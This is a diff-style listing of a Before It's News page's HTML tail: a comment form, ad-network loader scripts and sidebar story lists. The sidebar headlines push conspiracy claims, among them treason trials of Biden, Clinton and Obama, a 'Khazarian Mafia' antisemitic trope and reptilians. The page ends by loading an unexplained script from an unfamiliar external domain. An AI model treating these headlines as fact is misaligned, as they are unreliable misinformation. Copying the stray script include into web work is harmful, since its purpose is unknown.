+<div class="left_item" id="leftAdItem_3" style="margin: 20px 0;">
+<div id="M310742ScriptRootC720410">
+</div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720410.js"></script>
+</div>
+<div style="clear:both; margin-top: 30px;"></div>
+<div id="comments">
+<div id="b4in_comments_body">
+<a href="comments" id="comments" style="visibility:hidden"></a>
+<div id="respond">
+<h2>Comments</h2>
+<div class="cancel-comment-reply"><img src="/images/story/cross.png"> <a href="/opinion-conservative/2021/04/when-black-mass-shooters-kill-asians-its-not-a-hate-crime-3573071.html#respond" id="cancel-comment-reply-link" style="display:none;">Click here to cancel reply.</a></img></div>
+<form action="/core/ajax/comment/add_comment.php" id="commentform" method="post">
+<div class="wpn_comment_heading textarea_heading">Your Comments</div>
+<div class="wpn_field" style="margin:0;"><textarea id="comment_text" name="comment_text" rows="10" tabindex="4"></textarea></div>
+<div class="wpn_comment_submit">
+<img align="bottom" alt="Processing comment" height="24" id="comment_submiting" src="/images/misc/loading.gif" style="display:none; position: relative; top: 9px;" width="24">
+<div id="wp_emoticons" style="float:left">
+<a href="javascript:grin(':?:')"><img alt="Question   " src="/images/smilies/icon_question.gif" title="Question"/></a>
+<a href="javascript:grin(':razz:')"><img alt="Razz  " src="/images/smilies/icon_razz.gif" title="Razz"/></a>
+<a href="javascript:grin(':sad:')"><img alt="Sad   " src="/images/smilies/icon_sad.gif" title="Sad"/></a>
+<a href="javascript:grin(':evil:')"><img alt="Evil  " src="/images/smilies/icon_evil.gif" title="Evil"/></a>
+<a href="javascript:grin(':!:')"><img alt="Exclaim  " src="/images/smilies/icon_exclaim.gif" title="Exclaim"/></a>
+<a href="javascript:grin(':smile:')"><img alt="Smile  " src="/images/smilies/icon_smile.gif" title="Smile"/></a>
+<a href="javascript:grin(':oops:')"><img alt="Redface  " src="/images/smilies/icon_redface.gif" title="Redface"/></a>
+<a href="javascript:grin(':grin:')"><img alt="Biggrin  " src="/images/smilies/icon_biggrin.gif" title="Biggrin"/></a>
+<a href="javascript:grin(':eek:')"><img alt="Surprised  " src="/images/smilies/icon_surprised.gif" title="Surprised"/></a>
+<a href="javascript:grin(':shock:')"><img alt="Eek   " src="/images/smilies/icon_eek.gif" title="Eek"/></a>
+<a href="javascript:grin(':???:')"><img alt="Confused   " src="/images/smilies/icon_confused.gif" title="Confused"/></a>
+<a href="javascript:grin(':cool:')"><img alt="Cool  " src="/images/smilies/icon_cool.gif" title="Cool"/></a>
+<a href="javascript:grin(':lol:')"><img alt="LOL   " src="/images/smilies/icon_lol.gif" title="LOL"/></a>
+<a href="javascript:grin(':mad:')"><img alt="Mad   " src="/images/smilies/icon_mad.gif" title="Mad"/></a>
+<a href="javascript:grin(':twisted:')"><img alt="Twisted  " src="/images/smilies/icon_twisted.gif" title="Twisted"/></a>
+<a href="javascript:grin(':roll:')"><img alt="Rolleyes   " src="/images/smilies/icon_rolleyes.gif" title="Rolleyes"/></a>
+<a href="javascript:grin(':wink:')"><img alt="Wink  " src="/images/smilies/icon_wink.gif" title="Wink"/></a>
+<a href="javascript:grin(':idea:')"><img alt="Idea  " src="/images/smilies/icon_idea.gif" title="Idea"/></a>
+<a href="javascript:grin(':arrow:')"><img alt="Arrow  " src="/images/smilies/icon_arrow.gif" title="Arrow"/></a>
+<a href="javascript:grin(':neutral:')"><img alt="Neutral  " src="/images/smilies/icon_neutral.gif" title="Neutral"/></a>
+<a href="javascript:grin(':cry:')"><img alt="Cry   " src="/images/smilies/icon_cry.gif" title="Cry"/></a>
+<a href="javascript:grin(':mrgreen:')"><img alt="Mr. Green  " src="/images/smilies/icon_mrgreen.gif" title="Mr. Green"/></a>
+</div>
+<input id="comment_category_id" name="comment_category_id" type="hidden" value="29">
+<input id="comment_submit" name="submit" tabindex="5" type="button" value="Submit"/><input id="comment_post_ID" name="comment_post_ID" type="hidden" value="3573071"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</input></img></div>
+</form>
+</div>
+<br>
+</br></div>
+</div>
+<div class="clear"></div>
+<div class="rotating_text_link" id="rotating_text_link_18"></div>
+<div id="recent" style="display: ">
+<div class="header">MOST RECENT</div>
+<div class="content">
+<div id="most_recent_stories_list">
+</div>
+<div style="clear:both; height:20px;"></div>
+<div class="rotating_text_link" id="rotating_text_link_19"></div>
+<div class="left_item" id="leftAdItem_4" style="margin: 20px 0;">
+</div>
+<div class="load_more">
+<div class="loading" style="display: none;margin:50px auto; width: 100px;">
+<img src="//img.beforeitsnews.com/img/v3/loading.gif" width="100"/>
+</div>
+<a class="link ready" href="javascript:">Load more ...</a>
+<script type="text/javascript">var loaded = 22;</script>
+</div>
+</div>
+</div>
+</img></div>
+<div id="sidebar">
+<div class="widget-area">
+<div class="sb_top1">
+<div id="donate">
+<div class="donate_title">HELP KEEP NEWS FREE</div>
+<a class="btn_donate" href="/v3/donate/" onclick="gaTrackPageviewCustom('/donate_button_clicks')" style="padding: 3px 7px;">DONATE HERE</a>
+</div>
+<div id="ext_link">
+<a href="/v3/classic/" target="_blank">OLD VERSION</a>
+</div>
+<div id="forum_link" style="display: none;">
+<a href="//forum.beforeitsnews.com/b4in/login.php" target="_blank">FORUM</a>
+</div>
+</div>
+<div class="clear"></div>
+<div class="sb_top2">
+<div id="online">
+<table id="stats">
+<tbody>
+<tr>
+<td>Online:</td>
+<td><span id="chartbeat_site"></span></td>
+</tr>
+<tr>
+<td>Visits:</td>
+<td><span id="visit_count">1,469,071,963</span></td>
+</tr>
+<tr>
+<td>Stories:</td>
+<td><span id="story_count">7,873,091</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div id="upload_news">
+<div class="title">Wanted: Citizen Reporters,<br>Whistler Blowers, Insiders</br></div>
+<button class="btn_upload_news" id="submitnews">CLICK HERE TO UPLOAD NEWS!</button>
+</div>
+</div>
+<div class="ads"><img height="1" id="ad0" src="//img.beforeitsnews.com/img/v3/ads.png" width="1"/></div>
+<div class="clear"></div>
+<div class="sidebar_item" id="god_word"><table id="god_word_table" width="100%"><tbody><tr><td align="center"><div style="max-width:370px"><div class="god_word_item" id="god_word_20su2ZQNabo"><div id="god_word_video" onclick="god_word_video_onclick('20su2ZQNabo'); incr_clicks_god_word('174');" onmouseout="god_word_video_onmouseout();" onmouseover="god_word_video_onmouseover();" style="position: relative; cursor: pointer;"><img height="240" src="https://i.ytimg.com/vi/20su2ZQNabo/hqdefault.jpg" width="360"/><button aria-label="Play" class="ytp-large-play-button ytp-button"><svg height="100%" version="1.1" viewbox="0 0 68 48" width="100%"><path class="ytp-large-play-button-bg" d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55 C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19 C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#212121" fill-opacity="0.8"></path><path d="M 45,24 27,14 27,34" fill="#fff"></path></svg></button></div><div class="god_word_title">God's Word - Joshua (1-4)</div></div><hr style="width: 50%"/> <div class="god_word_title"><a class="god_word_link" href="https://www.youtube.com/user/nsearchofsouls/videos" onclick="gaTrackPageviewCustom('/listen_to_god_word_on_youtube')" rel="nofollow" target="_blank">Listen to God's Word on Youtube!</a></div><hr style="width: 80%"/> <div class="god_word_title"><a class="god_word_link" href="/v3/donate/" onclick="gaTrackPageviewCustom('/donate_to_share_god_word')" rel="nofollow">Donate to Share God's Word!</a></div></div></td></tr></tbody></table></div>
+<div id="bin_banners_contract_group2"></div>
+<div id="videos_rotating" style="position: relative; text-align: center; margin-top: 15px;"></div>
+<div class="sidebar_item">
+<div id="ld-4166-9392"></div>
+</div>
+<div class="sidebar_item" id="banners_contract_3"></div>
+<div class="rotating_text_link" id="rotating_text_link_1"></div>
+<div class="sidebar_item" id="banners_direct_regular_right"></div>
+<div id="bin_banners_contract_group1"></div>
+<div class="rotating_text_link" id="rotating_text_link_2"></div>
+<div class="sidebar_item" id="sbAdItem_1">
+<div id="M310742ScriptRootC351459">
+<div id="M310742PreloadC351459">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC351459")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC351459");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=351459;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.351459.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div>
+<div class="rotating_text_link" id="rotating_text_link_3"></div>
+<div id="blessing" style="margin-bottom: 20px">
+"Not by might, nor by power, but by my spirit, saith the Lord of hosts." Zechariah 4:6
+</div>
+<div id="bin_on_telegram">
+<center>BEFORE IT'S NEWS ON TELEGRAM</center>
+GET THE TELEGRAM APP - <a href="https://telegram.org/" rel="nofollow" target="_blank">https://telegram.org/</a>
+JOIN OUR CHANNEL - <a href="https://t.me/BeforeitsNews" target="_blank">https://t.me/BeforeitsNews</a>
+</div>
+<div id="subscribe" style="margin-bottom: 20px">
+<div class="title">Read it..</div>
+<div class="logo">BEFORE IT'S NEWS</div>
+<div class="head"><a href="#signup" onclick="$('#lightbox').click();">SIGN UP</a> FOR OUR NEWSLETTER</div>
+<div class="form">
+<form action="/newsletter/thank-you.php" id="form-newsletter" method="post" name="form-newsletter">
+<input autocomplete="off" id="email" name="email" placeholder="email address" size="30" type="text"/>
+<button id="btn-submit" name="btn-submit" type="submit">Submit</button>
+</form>
+</div>
+</div>
+<div id="today_top_stories">
+<div class="title">Today's Top Stories</div>
+<div class="content">
+<div class="link"><a class="title" href="/politics/2023/03/david-nino-rodriguez-live-tucker-goes-nuclear-america-outraged-msm-goes-into-full-panic-damage-control-must-video-3285258.html" target="_self">David Nino Rodriguez Live -Tucker Goes NUCLEAR! America OUTRAGED! MSM Goes Into Full Panic Damage Control!! - Must Video</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/situation-update-mar-8-2023-domestic-collapse-accelerates-as-sen-lindsey-graham-wants-to-invade-mexico-with-us-military-mike-adams-must-video-3656929.html" target="_self">Situation Update, Mar 8, 2023 - Domestic Collapse Accelerates As Sen. Lindsey Graham Wants To INVADE MEXICO With US Military! - Mike Adams Must Video</a></div><div class="link"><a class="title" href="/alternative/2023/03/phil-godlewski-crumble-video-3789697.html" target="_self">Phil Godlewski: CRUMBLE (Video) </a></div><div class="link"><a class="title" href="/alternative/2023/03/march-15th-315-booooom-biden-clinton-obama-trials-for-treason-begin-3789711.html" target="_self">March 15th [3:15] Booooom! Biden, Clinton, Obama Trials for Treason Begin!</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/just-in-house-republican-leaders-hold-press-briefing-after-tucker-carlsons-second-jan-6th-report-forbes-breaking-news-3656947.html" target="_self">Just In: House Republican Leaders Hold Press Briefing After Tucker Carlson's Second Jan 6th Report! - Forbes Breaking News</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/and-we-know-now-they-deep-state-are-showing-their-panic-eyes-are-opening-liars-cant-hide-hold-on-pray-must-video-3656951.html" target="_self">And We Know - NOW They [Deep State] Are SHOWING Their PANIC!! Eyes Are Opening! LIARS Can’t hide! HOLD ON! PRAY! - Must Video</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-sarge-huge-major-military-intel-3823-2539176.html" target="_self">New Sarge: Huge: Major Military Intel 3/8/23..</a></div><div class="link"><a class="title" href="/canada/2023/03/khazarian-mafiaassets-seized-vip-elite-panic-as-nuremberg-2-0-trials-for-crimes-against-humanity-becomes-realitypfizer-is-being-sued-for-3t-for-alleged-false-claims-about-covid-vaccines-5226.html" target="_self">Khazarian /Mafia/assets seized /VIP ELITE PANIC AS NUREMBERG 2.0 TRIALS FOR 'CRIMES AGAINST HUMANITY' BECOMES REALITY/PFIZER IS BEING SUED FOR $3T FOR ALLEGED FALSE CLAIMS ABOUT COVID VACCINES.</a></div><div class="link"><a class="title" href="/alternative/2023/03/sg-anon-situation-update-a-storm-is-coming-video-3789691.html" target="_self">SG Anon: Situation Update - A Storm is Coming (Video) </a></div><div class="link"><a class="title" href="/alternative/2023/03/charlie-ward-big-intel-3-8-23-explosion-is-happening-video-3789695.html" target="_self">Charlie Ward: BIG Intel 3.8.23: Explosion Is Happening!! (Video) </a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_2">
+<div class="rotating_text_link" id="rotating_text_link_4"></div>
+<div class="__JSCode1__">
+<div id="ld-8831-2310"></div><script>(function(w,d,s,i){w.ldAdInit=w.ldAdInit||[];w.ldAdInit.push({slot:10864440455450982,size:[0, 0],id:"ld-8831-2310"});if(!d.getElementById(i)){var j=d.createElement(s),p=d.getElementsByTagName(s)[0];j.async=true;j.src="//cdn2.customads.co/_js/ajs.js";j.id=i;p.parentNode.insertBefore(j,p);}})(window,document,"script","ld-ajs");</script>
+</div>
+<div class="__JSCode2__">
+<style>#M310742ScriptRootC720412 {min-height: 300px;}</style>
+<div id="M310742ScriptRootC720412">
+<div id="M310742PreloadC720412">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC720412")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC720412");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=720412;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.720412.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div> <div class="rotating_text_link" id="rotating_text_link_5"></div>
+</div>
+<div id="featured_stories">
+<div class="title">Featured</div>
+<div class="content">
+<div class="link"><a class="title" href="/foreclosure-gate/2023/03/we-just-witnessed-an-economic-red-flag-that-we-havent-seen-since-1981-2451535.html" target="_self">We Just Witnessed An Economic Red Flag That We Haven’t Seen Since 1981</a></div><div class="link"><a class="title" href="/eu/2023/03/tucker-carlson-live-march-8-2701263.html" target="_self">Tucker Carlson LIVE March 8</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/alert-you-need-to-prepare-for-this-now-youre-running-out-of-time-must-video-2477593.html" target="_self">ALERT! It's Coming! You NEED To Prepare For This NOW! You're Running Out Of Time! - Must Video</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-patriot-underground-michael-jaco-2539202.html" target="_self">New Patriot Underground &amp; Michael Jaco: Scare Event - WW3 Build Up - J6 Revelations - 5th Generation Warfare - Russian Offensive &amp; Geopolitical Realignment </a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/situation-update-white-hat-military-in-contact-with-scotus-to-hear-brunson-petition-or-face-charges-of-treason-bidennato-commit-two-acts-of-war-against-russia-we-the-3656986.html" target="_self">Situation Update - White Hat Military In Contact With SCOTUS To Hear Brunson Petition Or Face Charges Of Treason! Biden/NATO Commit Two Acts Of War Against Russia! - We The...</a></div><div class="link"><a class="title" href="/alternative/2023/03/breaking-this-is-devastating-oil-rig-on-fire-in-alabama-river-the-real-gs-news-3789716.html" target="_self">Breaking: This Is Devastating! Oil Rig On Fire In Alabama River! - The Real GS News</a></div><div class="link"><a class="title" href="/u-s-politics/2023/03/nanny-state-dead-ahead-video-2601815.html" target="_self">Nanny State Dead Ahead! (Video)</a></div><div class="link"><a class="title" href="/china/2023/03/breaking-china-threatens-usa-with-conflict-scripted-ww3-scenario-moves-closer-wam-2460959.html" target="_self">Breaking: China Threatens USA With Conflict! Scripted WW3 Scenario Moves Closer! -WAM</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/sg-anon-derek-johnson-urgent-drops-stream-382023-3656981.html" target="_self">SG Anon &amp; Derek Johnson Urgent Drops - Stream 3/8/2023</a></div><div class="link"><a class="title" href="/paranormal/2023/03/new-kerry-cassidy-dark-outpost-white-hats-secret-space-program-the-truth-2560739.html" target="_self">New Kerry Cassidy &amp; Dark Outpost - White Hats, Secret Space Program, The Truth!</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_3">
+<div class="rotating_text_link" id="rotating_text_link_6"></div>
+<div class="__JSCode1__">
+<div id="ld-4530-2279"></div><script>(function(w,d,s,i){w.ldAdInit=w.ldAdInit||[];w.ldAdInit.push({slot:8301289771671655,size:[0, 0],id:"ld-4530-2279"});if(!d.getElementById(i)){var j=d.createElement(s),p=d.getElementsByTagName(s)[0];j.async=true;j.src="//cdn2.customads.co/_js/ajs.js";j.id=i;p.parentNode.insertBefore(j,p);}})(window,document,"script","ld-ajs");</script>
+</div>
+<div class="__JSCode2__">
+<style>#M310742ScriptRootC720415 {min-height: 300px;}</style>
+<div id="M310742ScriptRootC720415">
+<div id="M310742PreloadC720415">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC720415")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC720415");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=720415;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.720415.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div> <div class="rotating_text_link" id="rotating_text_link_7"></div>
+</div>
+<div id="top_global">
+<div class="title">Top Global</div>
+<div class="content">
+<div class="link"><a class="title" href="/war-and-conflict/2023/03/alert-you-need-to-prepare-for-this-now-youre-running-out-of-time-must-video-2477593.html" target="_self">ALERT! It's Coming! You NEED To Prepare For This NOW! You're Running Out Of Time! - Must Video</a></div><div class="link"><a class="title" href="/paranormal/2023/03/new-kerry-cassidy-dark-outpost-white-hats-secret-space-program-the-truth-2560739.html" target="_self">New Kerry Cassidy &amp; Dark Outpost - White Hats, Secret Space Program, The Truth!</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/situation-update-white-hat-military-in-contact-with-scotus-to-hear-brunson-petition-or-face-charges-of-treason-bidennato-commit-two-acts-of-war-against-russia-we-the-3656986.html" target="_self">Situation Update - White Hat Military In Contact With SCOTUS To Hear Brunson Petition Or Face Charges Of Treason! Biden/NATO Commit Two Acts Of War Against Russia! - We The...</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-dr-jim-willie-march-madness-intel-banks-are-on-the-brink-more-countries-joining-brics-2539201.html" target="_self">New Dr. Jim Willie: March Madness Intel! Banks are on the Brink! More Countries Joining BRICS</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-patriot-underground-michael-jaco-2539202.html" target="_self">New Patriot Underground &amp; Michael Jaco: Scare Event - WW3 Build Up - J6 Revelations - 5th Generation Warfare - Russian Offensive &amp; Geopolitical Realignment </a></div><div class="link"><a class="title" href="/china/2023/03/breaking-china-threatens-usa-with-conflict-scripted-ww3-scenario-moves-closer-wam-2460959.html" target="_self">Breaking: China Threatens USA With Conflict! Scripted WW3 Scenario Moves Closer! -WAM</a></div><div class="link"><a class="title" href="/survival/2023/03/north-korea-u-s-generates-catastrophic-escalation-as-nuclear-war-is-realistic-2788158.html" target="_self">North Korea: U.S. Generates “Catastrophic Escalation” As Nuclear War is “Realistic”</a></div><div class="link"><a class="title" href="/paranormal/2023/03/new-dark-outpost-reptilian-bombshells-energy-weapons-zodiac-killer-2560734.html" target="_self">New Dark Outpost: Reptilian Bombshells! Energy Weapons! Zodiac Killer! </a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-melissa-redpill-murdoch-schumer-panic-to-stop-jan-6-tapes-elon-free-speech-samson-trump-3-8-23-2539195.html" target="_self">New Melissa Redpill: Murdoch &amp; Schumer PANIC to stop Jan 6 tapes, Elon Free Speech, Samson Trump 3-8-23</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-jesse-ventura-freedom-fighter-why-two-party-politics-must-end-2539190.html" target="_self">New Jesse Ventura: Freedom Fighter: Why Two-Party Politics Must End</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_4">
+<div class="rotating_text_link" id="rotating_text_link_8"></div>
+<style>
+    #M310742ScriptRootC720413 {
+        min-height: 300px;
+    }
+</style>
+<div id="M310742ScriptRootC720413"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720413.js"></script>
+<div class="rotating_text_link" id="rotating_text_link_9"></div>
+</div>
+<div id="top_alternative">
+<div class="title">Top Alternative</div>
+<div class="content">
+<div class="link"><a class="title" href="/prophecy/2023/03/best-taylor-03082023-night-shadows-we-war-and-fight-because-we-want-something-we-dont-have-and-then-we-ask-amiss-and-the-blind-lead-the-blind-2539203.html" target="_self">Best &amp; Taylor (03082023): NIGHT SHADOWS --We war and fight because we want something we don't have, and then, we ask amiss and the BLIND lead the BLIND</a></div><div class="link"><a class="title" href="/alternative/2023/03/pfizer-unable-to-finish-press-conference-as-spokespeople-keep-collapsing-satire-3789718.html" target="_self">Pfizer Unable To Finish Press Conference: As Spokespeople Keep Collapsing! - Satire</a></div><div class="link"><a class="title" href="/politics/2023/03/stone-choir-the-invention-of-racism-3285310.html" target="_self">Stone Choir: The Invention of Racism</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/wow-trumps-bold-new-proposals-for-2024-10-new-freedom-cities-baby-bonuses-flying-cars-3656987.html" target="_self">WOW! Trumps Bold New Proposals for 2024: 10 New Freedom Cities, Baby Bonuses, Flying Cars</a></div><div class="link"><a class="title" href="/awakening-start-here/2023/03/tucker-dropping-jan-6-footage-18133.html" target="_self">Tucker Dropping Jan 6 Footage…</a></div><div class="link"><a class="title" href="/politics/2023/03/trump-update-03082023-the-unselect-committee-of-political-hacks-thugs-should-be-tried-for-fraud-and-treason-and-those-imprisoned-and-being-persecuted-should-be-exonerated-and-released-now-3285303.html" target="_self">Trump update 03/08/2023..[The Unselect Committee of political Hacks &amp; Thugs] should be tried for Fraud and Treason, and those imprisoned and being persecuted should be exonerated and released, NOW!</a></div><div class="link"><a class="title" href="/alternative/2023/03/survival-will-depend-on-finding-inner-balance-1997-serapis-bey-3789712.html" target="_self">Survival Will Depend On Finding Inner Balance (1997 Serapis Bey)</a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/john-kerry-is-upset-that-china-being-a-bad-country-is-getting-in-the-way-of-solving-climate-apocalypse-3656974.html" target="_self">John Kerry Is Upset That China Being A Bad Country Is Getting In The Way Of Solving Climate Apocalypse</a></div><div class="link"><a class="title" href="/alternative/2023/03/march-15th-315-booooom-biden-clinton-obama-trials-for-treason-begin-3789711.html" target="_self">March 15th [3:15] Booooom! Biden, Clinton, Obama Trials for Treason Begin!</a></div><div class="link"><a class="title" href="/new-world-order/2023/03/is-nesaragesara-only-hopium-is-it-real-12557.html" target="_self">Is Nesara/Gesara only Hopium? Is it Real?</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_5">
+<div class="rotating_text_link" id="rotating_text_link_10"></div>
+<div class="rotating_text_link" id="rotating_text_link_12"></div> <div class="rotating_text_link" id="rotating_text_link_11"></div>
+</div>
+</div>
+</div>
+</div>
+</main>
+<div class="clear"></div>
+<div style="visibility: hidden;"><p><a href="/notyet/signup-v3.html" id="lightbox" name="lightbox">SignUp</a></p></div>
+<div style="visibility: hidden;"><p><a href="/notyet/login-v3.html" id="lightbox_login" name="lightbox_login">Login</a></p></div>
+<script src="/static/js-v3/tabs-bin-rev-202302041.js" type="text/javascript"></script>
+<script src="https://code.jquery.com/ui/1.13.1/jquery-ui.min.js"></script>
+<script src="/static/js-v3/story-bin-rev-202302041.js" type="text/javascript"></script>
+<div class="clear"></div>
+<div class="logo-bottom"></div>
+<div id="footer">
+<a href="/v3/about/">About</a> | <a href="/v3/advertise/">Advertise With Us</a> | <a href="/v3/faq/">FAQ</a> | <a href="/v3/contact/">Contact</a>
+| <a href="/v3/privacy/">Privacy</a> | <a href="/v3/terms/">Terms of Service</a>
+| <a href="/v3/copyright/">Copyright Notification</a> | <a href="/v3/subscribe/">RSS Subscribe</a> | <a href="/v3/widgets/">Widgets</a><br/><br/>
+Portions copyright © 2023 NSearch Technology, Inc., All Rights Reserved.<br/>Before It's News® is a registered Service Mark of NSearch Technology,
+Inc..<br/>
+</div>
+</div>
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+    }
+</script>
+<div style="visibility: hidden;"><p><a href="/contribute/newsletter/subscribe.html" id="lightbox_newsletter" name="lightbox_newsletter">Newsletter</a></p></div>
+<div style="visibility:hidden;"><a href="/bottom_send_mail/email.php" id="lightbox_email_send" title="Email this story">Email this story</a></div>
+<div style="visibility:hidden;"><a href="/bottom_float/email.html" id="lightbox_email" title="Email this story">Email this story</a></div>
+<div style="display: block">
+<div class="tooltipContent" id="likeContributorMessage"></div>
+<div class="tooltipContent" id="likeStoryMessage"></div>
+<div class="tooltipContent" id="authorMessage"></div>
+<div class="tooltipContent" id="subscribenewsletterMessage"></div>
+</div>
+<div style="display:none; clear: both">
+<div id="ban_reason">
+<p id="ban_reason_message">If you really want to ban this commenter, please write down the reason:</p>
+<textarea cols="200" id="ban_reason_content" rows="25" style="height: 200px; width: 550px"></textarea>
+</div>
+<div id="bin_alert"></div>
+<div id="turn_off_float_story">
+If you really want to disable all recommended stories, click on OK button. After that, you will be redirect to your options page.
+</div>
+</div>
+<script src="/static/js-v3/jsDeferParsing-bin-rev-202302041.js" type="text/javascript"></script>
+<noscript><iframe height="0" src="https://www.googletagmanager.com/ns.html?id=GTM-5D8XJ6Q" style="display:none;visibility:hidden" width="0"></iframe></noscript>
+<script async="" defer="" src="//egouages.site/easylist/12098" type="text/javascript"></script>
+</body>
+</html>
